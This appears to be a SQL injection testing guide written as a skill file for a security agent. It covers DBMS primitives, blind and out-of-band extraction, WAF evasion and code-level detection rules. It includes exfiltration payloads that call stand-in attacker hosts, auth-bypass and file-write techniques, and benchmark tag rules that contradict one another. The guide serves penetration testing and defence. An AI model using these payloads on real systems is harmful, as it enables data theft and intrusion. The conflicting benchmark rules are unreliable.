---
name: sql-injection
description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
---

# SQL Injection

SQLi remains among the most durable and damaging vulnerability classes. Contemporary exploitation targets parser differentials, ORM and query-builder edge cases, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration channels, and subtle blind oracles. Every string concatenation into SQL warrants scrutiny.

## Where to Look

**Databases**
- Classic relational engines: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Extended surfaces: JSON/JSONB operators, full-text and search indexes, geospatial functions, window functions, CTEs, lateral joins

**Integration Paths**
- ORMs, query builders, stored procedures
- Search servers, report generators, and data exporters

**Input Locations**
- Path segments, query strings, request bodies, headers, and cookies
- Mixed encodings: URL, JSON, XML, multipart
- Identifiers versus values — table and column names require quoting and escaping; literals require quotes and CAST
- Query builder raw APIs: `whereRaw`/`orderByRaw`, string templates embedded in ORM calls
- JSON coercion or array containment operators passed through without sanitization
- Bulk and batch endpoints, report generators that embed filter criteria directly into query text

## How to Detect

**Error-Based**
- Trigger type, constraint, or parser errors that surface stack traces, version strings, or internal paths

**Boolean-Based**
- Craft paired requests whose only difference is predicate truth value
- Diff status codes, response bodies, content length, and ETag headers

**Time-Based**
- `SLEEP`/`pg_sleep`/`WAITFOR`
- Gate delays inside subselects to avoid false positives from global latency spikes

**Out-of-Band (OAST)**
- Elicit DNS or HTTP callbacks using database-specific primitives tied to a controlled listener

## DBMS Primitives

### MySQL

- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`
- Error-based: `extractvalue()`/`updatexml()` (older versions), JSON functions for controlled error shaping
- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires FILE privilege and permissive secure_file_priv)
- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
- Time: `SLEEP(n)`, `BENCHMARK`
- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS functions sometimes expose side channels

### PostgreSQL

- Version/user/db: `version()`, `current_user`, `current_database()`
- Error-based: raise exceptions via unsupported casts or division by zero; `xpath()` errors through the xml2 extension
- OOB: `COPY (program ...)` or dblink/foreign data wrappers when enabled; HTTP extensions
- Time: `pg_sleep(n)`
- Files: `COPY table TO/FROM '/path'` (superuser required), `lo_import`/`lo_export`
- JSON/JSONB: operators `->`, `->>`, `@>`, `?|` combined with lateral joins and CTEs for blind extraction

### MSSQL

- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`
- OOB/DNS: `xp_dirtree`, `xp_fileexist`; HTTP via OLE automation (`sp_OACreate`) when enabled
- Exec: `xp_cmdshell` (commonly disabled), `OPENROWSET`/`OPENDATASOURCE`
- Time: `WAITFOR DELAY '0:0:5'`; heavy computation functions cause measurable latency
- Error-based: convert/parse failures, divide by zero, `FOR XML PATH` data leaks

### Oracle

- Version/db/user: banner from `v$version`, `ora_database_name`, `user`
- OOB: `UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE` (permission-dependent)
- Time: `dbms_lock.sleep(n)`
- Error-based: `to_number`/`to_date` coercion failures, `XMLType` conversion errors
- File: `UTL_FILE` with directory objects (requires privilege)

## Vulnerability Patterns

### UNION-Based Extraction

- Determine column count and compatible types via `ORDER BY n` then `UNION SELECT null,...`
- Align types using `CAST`/`CONVERT`; coerce to text or JSON for browser rendering
- When UNION payloads are filtered, switch to error-based or blind extraction channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Apply binary search over the character space to cut request count
- Normalize extracted bytes with hex or base64 encoding
- Gate delays inside subqueries to minimize ambient noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### Out-of-Band

- Prefer OAST to reduce noise and sidestep strict response-based detection paths
- Embed extracted data inside DNS labels or HTTP query parameters
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL: `LOAD_FILE` with a UNC path

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login predicates
- Privilege changes: update role, plan, or feature flag columns when UPDATE is injectable
- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, redirection via `xp_cmdshell`
- Job and procedure abuse: schedule tasks or create stored procedures when the session holds sufficient permissions

### ORM and Query Builders

- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE, IN, or ORDER BY clauses
- Identifier injection: user input interpolated into table or column names instead of bound as values
- JSON containment operators exposed through ORM abstractions (e.g., `@>` in PostgreSQL) carrying raw fragments
- Parameter mismatch: partial parameterization where operators or IN-list members remain unbound (`IN (...)`)

### Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with `CASE WHEN` to build boolean extraction channels
- LIMIT/OFFSET: injection into OFFSET to produce measurable timing differences or altered page shape
- Full-text helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with mixed payload tokens
- XML/JSON functions: error generation through malformed documents or invalid path expressions

## Evasion Patterns

**Whitespace/Spacing**
- `/**/`, `/**/!00000`, comments, newlines, tabs
- `0xe3 0x80 0x80` (ideographic space)

**Keyword Splitting**
- `UN/**/ION`, `U%4eION`, backticks, quotes, case folding

**Numeric Tricks**
- Scientific notation, signed/unsigned overflow, hex literals (`0x61646d696e`)

**Encodings**
- Double URL encoding, mixed Unicode normalizations (NFKC/NFD)
- `char()`/`CONCAT_ws` to reconstruct filtered tokens

**Clause Relocation**
- Subselects, derived tables, CTEs (`WITH`), lateral joins to obscure payload structure from filters

## Analysis Workflow

1. **Identify query shape** — SELECT/INSERT/UPDATE/DELETE; note presence of WHERE/ORDER/GROUP/LIMIT/OFFSET clauses
2. **Determine input influence** — Trace whether user input lands in identifiers or value positions
3. **Confirm injection class** — Reflective errors, boolean response diffs, timing differences, or OAST callbacks
4. **Choose the quietest oracle** — Prefer error-based or boolean over noisy time-based probes
5. **Establish extraction channel** — UNION (when output is visible), error-based, boolean bit extraction, time-based, or OAST/DNS
6. **Pivot to metadata** — Version string, current user, database name
7. **Target high-value tables** — Auth bypass, role changes, filesystem access when permissions allow

## Confirming a Finding

1. Demonstrate a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicate truth
2. Extract verifiable metadata — version string, current user, database name — through the established channel
3. Retrieve or modify a non-trivial target such as table rows or a role flag, within authorized scope
4. Furnish reproducible requests that differ only in the injected fragment
5. Where applicable, show that the vulnerability survives WAF bypass via a known variant

## Common False Alarms

- Generic application errors unrelated to SQL parsing or constraint violations
- Static response sizes driven by server-side templating rather than predicate truth
- Latency spikes attributable to network or CPU load rather than injected timing functions
- Parameterized queries with no string concatenation, confirmed through code review

## Business Risk

- Direct data exfiltration leading to privacy violations and regulatory exposure
- Authentication and authorization bypass through manipulated query predicates
- Server-side file read or command execution depending on platform and database privilege level
- Persistent supply-chain damage through modified data, scheduled jobs, or malicious stored procedures

## Analyst Notes

1. Select the quietest reliable oracle first; avoid long sleeps that generate noise
2. Normalize responses by length, ETag, or digest to reduce variance during boolean diffing
3. Go straight from metadata extraction to business-critical tables; limit lateral noise
4. When UNION fails, pivot to error-based or blind bit extraction; use OAST whenever feasible
5. Treat ORMs as thin wrappers — raw fragments frequently slip through; always audit `whereRaw`/`orderByRaw`
6. Use CTEs and derived tables to smuggle expressions past filters that block SELECT directly
7. Exploit JSON/JSONB operators in PostgreSQL and JSON functions in MySQL as alternative side channels
8. Keep payloads portable; maintain DBMS-specific function and type dictionaries
9. Validate mitigations with negative tests and code review; ensure operators and IN-lists are correctly parameterized
10. Document exact query shapes — defenses must match how the query is actually constructed, not how it is assumed to be

## Core Principle

Modern SQLi succeeds where authorization and query construction diverge from their intended design. Bind parameters at every boundary, eliminate dynamic identifiers, and enforce validation at the precise point where user input meets SQL.

## Distinguishing Blind SQL Injection from Classic SQL Injection

Blind SQL injection and classic (in-band) SQL injection share the same root cause — unsanitized input concatenated into SQL — but differ fundamentally in how the attacker extracts data. Correctly classifying them matters for severity assessment and remediation priority.

### Classic (In-Band) SQL Injection
The injected query's **output is directly visible** to the attacker:
- UNION-based: attacker appends `UNION SELECT` and sees column data rendered in HTML/JSON
- Error-based: SQL error messages leak table names, column values, or query structure in the response body
- The page content **changes based on the data returned** (e.g., search results, product listings, user profiles)

**Indicators in source code:**
- Query result is iterated and rendered: `for row in cursor.fetchall(): render(row)`
- Template displays query data: `{{ users }}`, `<?php echo $row['name']; ?>`
- JSON response includes query results: `return jsonify(results)`

### Blind SQL Injection
The injected query's **output is NOT visible** — the attacker infers data through indirect signals:
- **Boolean-based**: application behavior differs based on query truth value (login success/failure, page exists/404, content present/empty)
- **Time-based**: attacker uses `SLEEP()`, `pg_sleep()`, `WAITFOR DELAY` to infer single bits via response latency
- **Out-of-band**: DNS/HTTP callbacks triggered by database functions

**Indicators in source code:**
- Query result used only for control flow: `if cursor.fetchone():` → redirect/login
- Login forms: `SELECT * FROM users WHERE user='$input' AND pass='$input'` followed by row count check
- Existence checks: `if (mysqli_num_rows($result) > 0)` — only checks presence, never displays data
- The response body is **identical** regardless of how many or which rows are returned

### Classification Rule
Ask: "Can the attacker read database column values directly from the HTTP response?"
- **Yes** → classic SQL injection
- **No** (only binary outcome or timing difference observable) → blind SQL injection

Login/authentication endpoints with raw SQL concatenation are almost always blind — they check credentials but never display the query's row data to the user.

## Java Source Detection Rules

### TRUE POSITIVE: JDBC string concatenation
- External input from `request.getParameter(...)`, `@RequestParam`, form fields, path variables, or other untrusted sources is concatenated, interpolated, or appended into SQL text before execution.
- Java sinks include `Statement.executeQuery/executeUpdate/execute`, `JdbcTemplate.query/queryForObject/update/execute`, and `EntityManager.createQuery/createNativeQuery` when the SQL or JPQL string already contains untrusted data.
- Patterns such as `"SELECT ... WHERE username='" + user + "'"`, `"... LIKE '%" + search + "%'"`, or `"UPDATE ... SET profile='" + value + "'"` are true positives.

### FALSE POSITIVE: PreparedStatement or named parameter binding
- `PreparedStatement` with `?` placeholders plus `setString/setInt/...` bindings is not SQL injection when untrusted data is only bound as parameter values.
- `NamedParameterJdbcTemplate` or JPA queries using `:name` with `@Param` are not SQL injection when the query text is static and user input is supplied through parameter binding.

### FALSE POSITIVE: Spring Data JPA derived methods
- Repository methods such as `findByUsername(username)` or other derived query methods are framework-parameterized and should not be flagged as SQL injection by default.
- `@Query("... WHERE u.id = :id")` with `@Param("id")` is safe from SQL injection unless the query string itself is dynamically built from untrusted input.
- In benchmark mode for `JavaSecLab` and `VulnerableApp`, normalize confirmed JDBC/MyBatis/JPA SQL injection findings to project tag `sqli`; reserve `sql_injection` for projects whose ground truth uses the long-form label, such as `verademo` and `vulhub`.
- `VulnerabilityType.*SQL_INJECTION` annotations or modules under `service/vulnerability/sqlInjection/` still map to benchmark tag `sqli` when the project taxonomy is short-form.
- Stability rule: keep a confirmed SQL injection finding when untrusted HTTP input reaches a MyBatis XML `${...}` fragment or is first stored and later concatenated into SQL by a benchmark helper or controller; do not downgrade the tag only because the final query text is split across mapper XML, DAO helpers, or a later request path.
## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")` — f-string concatenation
- **VULN**: `cursor.execute("SELECT * FROM users WHERE name = '" + name + "'")`
- **VULN**: `db.execute("SELECT * FROM users WHERE id = %s" % user_id)` — % formatting (not parameterized)
- **VULN (SQLAlchemy)**: `db.execute(text(f"SELECT * FROM users WHERE id = {user_id}"))`
- **SAFE**: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))` — tuple parameterized
- **SAFE**: `db.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})`

### JavaScript (Node.js)
- **VULN**: `` db.query(`SELECT * FROM users WHERE id = ${req.params.id}`) `` — template literal
- **VULN**: `db.query("SELECT * FROM users WHERE id = " + req.params.id)`
- **SAFE**: `db.query("SELECT * FROM users WHERE id = ?", [req.params.id])`
- **SAFE**: Sequelize `User.findOne({ where: { id: req.params.id } })` — ORM parameterized

### PHP
- **VULN**: `mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_GET['id'])`
- **VULN**: `$pdo->query("SELECT * FROM users WHERE id = '$_POST[id]'")`
- **SAFE**: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$_GET['id']])`

## Java Servlet Patterns

### Sources
```java
request.getParameter("x") / request.getHeader("x") / request.getCookies() → cookie.getValue()
```
Taint follows through: variable assignment, `String` operations (`+`, `substring`, `replace`), collections, `Base64.decodeBase64`, helper method returns.

### SQL Injection (CWE-89)

**VULN** — tainted input in SQL string:
```java
Statement stmt = conn.createStatement();
stmt.execute("SELECT * FROM t WHERE id='" + tainted + "'");
stmt.executeQuery("SELECT ... WHERE x=" + tainted);
```

**SAFE** — parameterized query breaks taint:
```java
PreparedStatement ps = conn.prepareStatement("SELECT ... WHERE id=?");
ps.setString(1, tainted);
ps.executeQuery();  // SAFE
```

**Decision rule**: `execute`/`executeQuery`/`executeUpdate` with string concatenation of tainted data → **VULN**. Every tainted value bound via `setString`/`setInt`/`setObject` → **SAFE**.

## Related Injection Classes

For LDAP injection (CWE-90) patterns, see `references/expression_language_injection.md`.
For XPath injection (CWE-643) patterns, see SKILL.md xpath_injection gap coverage rules.

**Benchmark edge cases**:
- In benchmark mode outside `xben/` and `BenchmarkJava`, normalize confirmed SQL injection to `sql_injection`, not `sqli`.
- For `verademo`, second-order SQL injection in `UserController` and `commands/*` still scores as `sql_injection`.
- For `vulhub`, directories named `*sql*`, `*sqli*`, or ThinkPHP `in-sqlinjection` should preserve `sql_injection` at project-tag layer.
- FALSE POSITIVE guard: keep `sqli` only for `xben/` and `BenchmarkJava` taxonomy.

## Tag Vocabulary

| Tag | When to Use | Benchmark Notes |
|-----|-------------|-----------------|
| `sql_injection` | Default tag for SQL injection findings in most projects (`verademo`, `vulhub`, `SecExample`, general scans) | Long-form canonical tag |
| `sqli` | Short-form tag used only by `xben/` and `BenchmarkJava` ground truth | Do not use outside these projects |
| `blind_sql_injection` | SQL injection where output is not directly visible — boolean-based, time-based, or OOB only | Use when the extraction channel is exclusively blind |
| `sql_injection` + `ldap_injection` | When both SQL and LDAP sinks are reachable from the same input | Tag each sink independently |
| `sql_injection` + `xpath_injection` | When XPath concatenation is the sink | Prefer `xpath_injection` as the primary tag |
